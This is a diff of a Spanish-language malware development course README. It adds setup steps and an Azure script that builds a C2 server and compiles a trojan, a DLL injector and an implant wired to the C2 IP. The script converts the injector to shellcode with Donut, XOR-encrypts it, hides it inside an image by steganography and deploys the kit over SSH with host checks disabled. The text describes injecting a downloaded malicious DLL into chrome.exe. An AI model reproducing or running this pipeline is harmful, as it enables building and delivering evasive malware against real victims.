@@ -8,13 +8,17 @@ El malware de este curso es una PoC cuyo objetivo es realizar una inyección de 
 
 La ponencia muestra su desarrollo desde Distribucion Linux Debian, sin embargo esto tambien es viable desde el Sistema Operativo Android apoyandonos con el [emulador de terminal Termux](https://github.com/termux)
 
-- Dependencias
+- Dependencias en Linux
 ```bash
 apt update && yes|apt upgrade
-yes|apt install curl mingw-w64 python python-pip python-pillow python-numpy
+yes|apt install curl mingw-w64 python python-pip rust gcc cargo winehq-stable
+python3 -m pip install pillow numpy azure-cli
 ```
-	NOTA: en distribuciones Linux pillow y numpy se instala desde PIP.
-
+- Dependencias en Termux
+```bash
+apt update && yes|apt upgrade
+yes|apt install curl python python-pip python-pillow python-numpy
+```
 METASPLOIT-FRAMEWORK con [Termux-packages](https://github.com/ivam3/termux-packages) de @Ivam3 :
 ```bash
 mkdir -p $PREFIX/etc/apt/sources.list.d
@@ -22,7 +26,15 @@ curl https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-term
 apt update && yes|apt upgrade
 yes|apt install metasploit-framework
 ```
-
+- Dependencias en Alpine
+```bash
+apk update && apk upgrade
+apk add python3 python3-dev py3-pip libsodium libffi libffi-dev clang make cmake gcc libc-dev rust cargo mingw-w64-gcc wine
+python3 -m pip install --upgrade pip
+export PKG_CONFIG_PATH=/usr/lib/pkgconfig
+export CARGO_BUILD_TARGET=$(rustc --version --verbose|sed -n 's|host: ||p')
+python3 -m pip install wheel setuptools_rust azure-cli
+```
 - Creacion de entorno de trabajo
 ```bash
 mkdir -p PoC-maldev && cd $_ # Crea e ingresa al directorio PoC-maldev
@@ -451,7 +463,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 ```
 
-- Script PoC-maldev/compile.sh : Script de compiladoción para Linux (Bash)
+- Script PoC-maldev/compile.sh : Script de compilación para Linux (Bash)
 ```bash
 #!/bin/bash
 
@@ -489,7 +501,7 @@ compile.bat
 Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
 
 
-2. Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta Donut.
+2. Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta [Donut](https://github.com/TheWover/donut).
 
     Apoyate con el video de la ponencia en su [Segunda Parte](https://t.me/Ivam3_Bot) al adquirir tu [Membresia de la comunidad](https://www.youtube.com/ivam3bycinderella/join)
 
@@ -798,8 +810,22 @@ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp dllinjector.cpp /link /OUT:dllinjec
     Esto creara los archivos dllinjector.exe & evil.dll
 
 - Generación de shellcode payload a partir del dllinjector.exe con [Donut](https://github.com/TheWover/donut) y [Wine](https://www.winehq.org/)
+
+  - Instalacion de Donut
+```bash
+wget https://github.com/TheWover/donut/releases/download/v0.9.3/donut_v0.9.3.zip -O PoC-maldev/donut.zip
+unzip PoC-maldev/donut.zip -p donut.exe > donut.exe
+rm PoC-maldev/donut.zip
+```
+
+  - Ejecucion en Linux
 ```bash
 wine donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe
+```
+
+  - Ejecucion en Alpine
+```bash
+wine64 donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe
 ```
 
 Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
@@ -1051,12 +1077,14 @@ if __name__ == "__main__":
 ```bash
 #!/bin/bash
 
+echo "[+] Create an acount in https://microsoft.com/ and follow the next steps:"
+az login
 echo "[+] Creating CrashCourseMaldev resource group..."
 az group create --name CrashCourseMaldev --location eastus > /dev/null 2>&1
 echo "[+] CrashCourseMaldev resource group successfully created"
 
 echo "[+] Creating C2 instance..."
-user="user"
+user=$(whoami | sed 's/\n//g')
 c2ip=$(az vm create \
     --resource-group CrashCourseMaldev \
     --name c2 \
@@ -1070,6 +1098,7 @@ c2ip=$(az vm create \
     --public-ip-address-allocation static \
     --public-ip-sku Standard \
     --storage-sku Standard_LRS \
+    --only-show-errors \
     | grep publicIpAddres | awk -F': ' '{print $2}' | sed 's/["]//g' | sed 's/,//g')
 echo "[+] C2 instance successfully created"
 echo "[+] C2 IP address: $c2ip"
@@ -1116,59 +1145,70 @@ az network nsg rule create \
 echo "[+] Inbound rule for port 443 added to c2-nsg"
 
 echo "[+] Compiling implant.exe..."
-sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" implant.cpp
-x86_64-w64-mingw32-g++ -o implant implant.cpp -lwsock32 -lws2_32
+sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" Part3/implant.cpp
+x86_64-w64-mingw32-g++ -o Part3/implant Part3/implant.cpp -lwsock32 -lws2_32
 
 echo "[+] Generating implant.c shellcode..."
 export WINEDEBUG=fixme-all
-wine donut.exe -b 1 -o implant.c -f 3 -t implant.exe > /dev/null 2>&1
-sed -i 's/buf/shellcodePayload/' implant.c
-sed -i 's/^.*unsigned char shellcodePayload\[\] =.*$//g' evildll.cpp
-sed -i '/\x[a-f0-9]\{2\}/d' evildll.cpp
-sed -i '6 r implant.c' evildll.cpp
+wine donut.exe -b 1 -o Shellcodes/implant.c -f 3 -t Part3/implant.exe > /dev/null 2>&1
+sed -i 's/buf/shellcodePayload/' Shellcodes/implant.c
+sed -i 's/^.*unsigned char shellcodePayload\[\] =.*$//g' Part2/evildll.cpp
+sed -i '/\x[a-f0-9]\{2\}/d' Part2/evildll.cpp
+sed -i '6 r Shellcodes/implant.c' Part2/evildll.cpp
 
 echo "[+] Compiling dllinjector.exe and evildll.dll..."
-sed -i "s/\\(http:\\/\\/\)[0-9]\\{1,3\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\(:80\\/.*\\)/\\1$c2ip\\2/" dllinjector.cpp
-x86_64-w64-mingw32-g++ -shared -o evildll.dll evildll.def evildll.cpp
-x86_64-w64-mingw32-g++ -o dllinjector dllinjector.cpp -Wno-all -lurlmon -lwininet -Wl,--subsystem,windows
+sed -i "s/\\(http:\\/\\/\)[0-9]\\{1,3\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\(:80\\/.*\\)/\\1$c2ip\\2/" Part2/dllinjector.cpp
+x86_64-w64-mingw32-g++ -shared -o Part2/evildll.dll Part2/evildll.def Part2/evildll.cpp
+x86_64-w64-mingw32-g++ -o Part2/dllinjector Part2/dllinjector.cpp -Wno-all -lurlmon -lwininet -Wl,--subsystem,windows
 
 echo "[+] Generating dllinjector.bin shellcode..."
-wine donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe > /dev/null 2>&1
+wine donut.exe -e 1 -b 1 -o Shellcodes/dllinjector.bin -t Part2/dllinjector.exe > /dev/null 2>&1
 
 echo "[+] Encrypting dllinjector.bin shellcode..."
-python3 xor.py dllinjector.bin
-mv encrypted.bin dllinjectorencrypted.bin
+python3 Scripts/xor.py Shellcodes/dllinjector.bin
+mv encrypted.bin Shellcodes/dllinjectorencrypted.bin
 
-echo "[+] Injecting dllinjectorecnryped.bin into pornhub.png..."
-python3 lsb.py -hide pornhub.png dllinjectorencrypted.bin pornhublsb.png > /dev/null 2>&1
+echo "[+] Injecting dllinjectorencrypted.bin into pornhub.png..."
+python3 Scripts/lsb.py -hide Part1/pornhub.png Shellcodes/dllinjectorencrypted.bin Part1/pornhublsb.png > /dev/null 2>&1
 
 echo "[+] Compiling trojan.exe..."
-sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" trojan.cpp
-x86_64-w64-mingw32-windres -o resources.o resources.rc
-x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows resources.o
+sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" Part1/trojan.cpp
+x86_64-w64-mingw32-windres -o Part1/resources.o Part1/resources.rc
+x86_64-w64-mingw32-g++ -o Part1/trojan Part1/trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows Part1/resources.o
 
 echo "[+] Ziping resources into Test.zip ..."
-zip -r Test.zip trojan.exe evildll.dll server1.py server2.py
+zip -r Test.zip Part1/trojan.exe Part2/evildll.dll Servers
 
 echo "[+] Sending setup.sh and Test.zip to C2..."
-scp -P 22 setup.sh $user@$c2ip:/home/$user/setup.sh
-scp -P 22 Test.zip $user@$c2ip:/home/$user/Test.zip
+sed -i "s/\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\"/\"$bmip\"/" setup.sh
+sed -i "s/user/$user/" setup.sh
+yes|scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" setup.sh $user@$c2ip:/home/$user/setup.sh > /dev/null 2>&1
+yes|scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" Test.zip $user@$c2ip:/home/$user/Test.zip > /dev/null 2>&1
 
-echo "[+] Seting up C2 server..."
-ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" $user@$c2ip "chmod +x /home/$user/setup.sh && bash /home/$user/setup.sh"
+echo "[+] Setting up C2 server..."
+yes|ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" $user@$c2ip "chmod +x /home/$user/setup.sh && bash /home/$user/setup.sh" > /dev/null 2>&1
 
 echo "[+] Done!"
+echo "[+] Connect with: ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' $user@$c2ip"
 ```
 
 - Script PoC-maldev/setup.sh
 ```bash
 #!/bin/bash
 
-sudo apt-get update && sudo apt-get full-upgrade -y && sudo apt-get install python3-pip zip unzip -y
-echo "export PATH=/home/user/.local/bin:$PATH" >> /home/user/.bashrc
+ip="192.168.100.20"
+user=$(whoami | sed 's/\n//g')
+sudo apt-get update && sudo apt-get full-upgrade -y && sudo apt-get install python3-pip unzip -y
+echo "export PATH=/home/$user/.local/bin:$PATH" >> /home/$user/.bashrc
 python3 -m pip install --upgrade pip
 python3 -m pip install Pillow numpy
 unzip Test.zip && rm Test.zip
+gcc -o Servers/server2 Servers/server.c
+sudo ufw allow from $ip proto tcp to any port 22
+sudo ufw allow from $ip proto tcp to any port 80
+sudo ufw allow from $ip proto tcp to any port 443
+sudo ufw allow from $ip proto tcp to any port 4444
+yes|sudo ufw enable
 ```
 
 - Script PoC-maldev/rmrsrc.sh
@@ -1182,7 +1222,7 @@ az group delete --name NetworkWatcherRG --yes --verbose
 echo "Deleting DefaultResourceGroup-EUS resource group..."
 az group delete --name DefaultResourceGroup-EUS --yes --verbose
 echo "Deleting all generated files"
-rm {pornhublsb.png,resources.o,trojan.exe,dllinjector.exe,evildll.dll,client.exe,implant.c,dllinjector.bin,dllinjectorencrypted.bin,Test.zip}
+rm Part1/{pornhublsb.png,resources.o,trojan.exe} Part2/{dllinjector.exe,evildll.dll} Part3/client.exe Shellcodes/* Test.zip
 rm $HOME/.ssh/{id_rsa,id_rsa.pub}
 ```
 
